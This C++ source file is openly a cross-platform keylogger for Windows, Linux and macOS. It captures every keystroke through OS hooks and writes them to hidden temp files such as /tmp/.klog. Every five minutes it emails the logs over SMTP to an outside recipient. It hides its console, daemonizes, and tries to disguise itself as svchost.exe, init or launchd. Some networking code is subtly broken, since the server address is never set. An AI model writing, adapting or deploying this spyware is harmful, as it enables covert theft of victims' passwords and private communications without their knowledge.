#include <iostream>
#include <fstream>
#include <ctime>
#include <string>
#include <stdexcept>
#include <vector>
#include <chrono>
#include <thread>
#include <sstream>
#include <openssl/ssl.h>
#include <openssl/err.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "libssl.lib")
    #pragma comment(lib, "libcrypto.lib")
    const std::string LOG_FILE = "C:\\Windows\\Temp\\.klog";
#elif __linux__
    #include <X11/Xlib.h>
    #include <X11/Xutil.h>
    #include <unistd.h>
    #include <sys/stat.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    const std::string LOG_FILE = "/tmp/.klog";
#elif __APPLE__
    #include <ApplicationServices/ApplicationServices.h>
    #include <CoreFoundation/CoreFoundation.h>
    #include <signal.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    const std::string LOG_FILE = "/var/tmp/.klog";
#else
    #error "Unsupported OS"
#endif

const int EMAIL_INTERVAL_SECONDS = 300;
const std::string SMTP_SERVER = "smtp.gmail.com";
const int SMTP_PORT = 587;
const std::string SMTP_USER = "your-email@gmail.com"; // Replace
const std::string SMTP_PASS = "your-app-password";    // Replace
const std::string SMTP_FROM = SMTP_USER;
const std::string SMTP_TO = "recipient@gmail.com";    // Replace

// Base64 encoding
std::string base64_encode(const std::string& in) {
    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    unsigned char buf[3], out_buf[4];
    size_t i = 0, j = 0;
    for (auto c : in) {
        buf[i++] = c;
        if (i == 3) {
            out_buf[0] = (buf[0] & 0xfc) >> 2;
            out_buf[1] = ((buf[0] & 0x03) << 4) + ((buf[1] & 0xf0) >> 4);
            out_buf[2] = ((buf[1] & 0x0f) << 2) + ((buf[2] & 0xc0) >> 6);
            out_buf[3] = buf[2] & 0x3f;
            for (i = 0; i < 4; i++) out += base64_chars[out_buf[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) buf[j] = '\0';
        out_buf[0] = (buf[0] & 0xfc) >> 2;
        out_buf[1] = ((buf[0] & 0x03) << 4) + ((buf[1] & 0xf0) >> 4);
        out_buf[2] = ((buf[1] & 0x0f) << 2) + ((buf[2] & 0xc0) >> 6);
        out_buf[3] = buf[2] & 0x3f;
        for (j = 0; j < i + 1; j++) out += base64_chars[out_buf[j]];
        while (i++ < 3) out += '=';
    }
    return out;
}

// Log function
void log_key(const std::string& key) {
    for (int i = 0; i < 3; ++i) {
        try {
            std::ofstream file(LOG_FILE, std::ios::app);
            if (!file.is_open()) throw std::runtime_error("Cannot open log file");
            std::time_t now = std::time(nullptr);
            file << "[" << std::ctime(&now) << "] " << key << std::endl;
            file.close();
            return;
        } catch (const std::exception&) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
}

// SMTP with TLS (simplified for brevity)
void send_email_log() {
    std::ifstream file(LOG_FILE);
    std::stringstream log_content;
    std::string line;
    while (std::getline(file, line)) log_content << line << "\n";
    file.close();
    if (log_content.str().empty()) return;

    #ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    #endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(SMTP_PORT);
    struct hostent* host = gethostbyname(SMTP_SERVER.c_str());
    if (!host || connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) return;

    SSL_library_init();
    SSL_CTX* ctx = SSL_CTX_new(SSLv23_client_method());
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    std::vector<std::string> commands = {"EHLO localhost\r\n", "STARTTLS\r\n"};
    char buffer[1024];
    for (const auto& cmd : commands) {
        send(sock, cmd.c_str(), cmd.length(), 0);
        recv(sock, buffer, sizeof(buffer), 0);
    }
    if (SSL_connect(ssl) != 1) return;

    std::vector<std::string> auth_commands = {
        "EHLO localhost\r\n", "AUTH LOGIN\r\n", base64_encode(SMTP_USER) + "\r\n",
        base64_encode(SMTP_PASS) + "\r\n", "MAIL FROM:<" + SMTP_FROM + ">\r\n",
        "RCPT TO:<" + SMTP_TO + ">\r\n", "DATA\r\n",
        "Subject: Keylogger Log\r\n\r\n" + log_content.str() + "\r\n.\r\n", "QUIT\r\n"
    };
    for (const auto& cmd : auth_commands) {
        SSL_write(ssl, cmd.c_str(), cmd.length());
        SSL_read(ssl, buffer, sizeof(buffer));
    }

    SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);
    #ifdef _WIN32
        closesocket(sock); WSACleanup();
    #else
        close(sock);
    #endif

    std::ofstream clear_file(LOG_FILE, std::ios::trunc);
    clear_file.close();
}

// Windows keylogger
#ifdef _WIN32
HHOOK keyboard_hook = nullptr;

LRESULT CALLBACK keyboard_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kb_struct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD key = kb_struct->vkCode;
        std::string key_str;
        if (key == VK_BACK) key_str = "[BACKSPACE]";
        else if (key == VK_SPACE) key_str = "[SPACE]";
        else if (key == VK_RETURN) key_str = "[ENTER]";
        else if (key == VK_TAB) key_str = "[TAB]";
        else if (key == VK_ESCAPE) key_str = "[ESC]";
        else if (key >= 32 && key <= 126) {
            BYTE keyboard_state[256] = {0};
            WCHAR buffer[2];
            GetKeyboardState(keyboard_state);
            if (ToUnicode(key, kb_struct->scanCode, keyboard_state, buffer, 2, 0) > 0)
                key_str = std::string(1, (char)buffer[0]);
        } else {
            key_str = "[Key " + std::to_string(key) + "]";
        }
        log_key(key_str);
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

void run_windows_keylogger() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, GetModuleHandle(nullptr), 0);
    if (!keyboard_hook) return;

    auto last_email = std::chrono::steady_clock::now();
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_email).count() >= EMAIL_INTERVAL_SECONDS) {
            send_email_log();
            last_email = now;
        }
    }
    UnhookWindowsHookEx(keyboard_hook);
}
#endif

// Linux keylogger
#ifdef __linux__
void run_linux_keylogger() {
    if (getenv("WAYLAND_DISPLAY")) {
        log_key("ERROR: Wayland detected; X11 required.");
        return;
    }

    pid_t pid = fork();
    if (pid > 0) exit(0);
    else if (pid < 0) return;
    setsid();
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    Display* display = XOpenDisplay(nullptr);
    if (!display) {
        log_key("ERROR: Cannot open X display");
        return;
    }

    Window root = DefaultRootWindow(display);
    XSelectInput(display, root, KeyPressMask);

    auto last_email = std::chrono::steady_clock::now();
    XEvent event;
    while (true) {
        XNextEvent(display, &event);
        if (event.type == KeyPress) {
            KeySym keysym = XLookupKeysym(&event.xkey, 0);
            std::string key_str;
            if (keysym == XK_BackSpace) key_str = "[BACKSPACE]";
            else if (keysym == XK_space) key_str = "[SPACE]";
            else if (keysym == XK_Return) key_str = "[ENTER]";
            else if (keysym == XK_Tab) key_str = "[TAB]";
            else if (keysym == XK_Escape) key_str = "[ESC]";
            else {
                char* key = XKeysymToString(keysym);
                key_str = key ? std::string(key) : "[Key " + std::to_string(keysym) + "]";
            }
            log_key(key_str);
        }
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_email).count() >= EMAIL_INTERVAL_SECONDS) {
            send_email_log();
            last_email = now;
        }
    }
    XCloseDisplay(display);
}
#endif

// macOS keylogger
#ifdef __APPLE__
volatile sig_atomic_t keep_running = 1;

void signal_handler(int sig) {
    keep_running = 0;
}

CGEventRef key_event_callback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void* refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        UniChar buffer[2];
        UniCharCount length;
        CGEventKeyboardGetUnicodeString(event, 2, &length, buffer);

        std::string key_str;
        if (length > 0) {
            char c = (char)buffer[0];
            if (c == 8) key_str = "[BACKSPACE]";
            else if (c == 9) key_str = "[TAB]";
            else if (c == 10) key_str = "[ENTER]";
            else if (c == 27) key_str = "[ESC]";
            else if (c >= 32 && c <= 126) key_str = std::string(1, c);
            else key_str = "[Char " + std::to_string((int)c) + "]";
        } else {
            key_str = "[Key " + std::to_string(keycode) + "]";
        }

        if (keycode == 51) key_str = "[BACKSPACE]";
        else if (keycode == 49) key_str = "[SPACE]";
        else if (keycode == 36) key_str = "[ENTER]";
        else if (keycode == 48) key_str = "[TAB]";
        else if (keycode == 53) key_str = "[ESC]";
        else if (keycode == 117) key_str = "[DELETE]";
        else if (keycode == 123) key_str = "[LEFT]";
        else if (keycode == 124) key_str = "[RIGHT]";
        else if (keycode == 125) key_str = "[UP]";
        else if (keycode == 126) key_str = "[DOWN]";

        log_key(key_str);
    }
    return event;
}

void run_macos_keylogger() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    pid_t pid = fork();
    if (pid > 0) exit(0);
    else if (pid < 0) return;
    setsid();
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    CFMachPortRef event_tap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, kCGEventTapOptionDefault,
        CGEventMaskBit(kCGEventKeyDown), key_event_callback, nullptr);
    if (!event_tap) {
        log_key("ERROR: Failed to create event tap.");
        return;
    }

    CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes);
    CGEventTapEnable(event_tap, true);

    log_key("Keylogger started in stealth mode");
    auto last_email = std::chrono::steady_clock::now();

    while (keep_running) {
        CFRunLoopRunInMode(kCFRunLoopDefaultMode, 1.0, false);
        auto now = std::chrono::steady_clock::now();
        if (std::chrono::duration_cast<std::chrono::seconds>(now - last_email).count() >= EMAIL_INTERVAL_SECONDS) {
            send_email_log();
            last_email = now;
        }
    }

    CFRunLoopRemoveSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopCommonModes);
    CFRelease(run_loop_source);
    CFRelease(event_tap);
    log_key("Keylogger stopped");
}
#endif

int main(int argc, char* argv[]) {
    #ifdef _WIN32
        if (argc > 0) argv[0] = "svchost.exe";
    #elif __linux__
        if (argc > 0) argv[0] = const_cast<char*>("init");
    #elif __APPLE__
        if (argc > 0) argv[0] = const_cast<char*>("launchd");
    #endif

    log_key("Keylogger initializing");

    #ifdef _WIN32
        run_windows_keylogger();
    #elif __linux__
        run_linux_keylogger();
    #elif __APPLE__
        run_macos_keylogger();
    #else
        std::cerr << "No keylogger implementation for this OS" << std::endl;
    #endif

    return 0;
}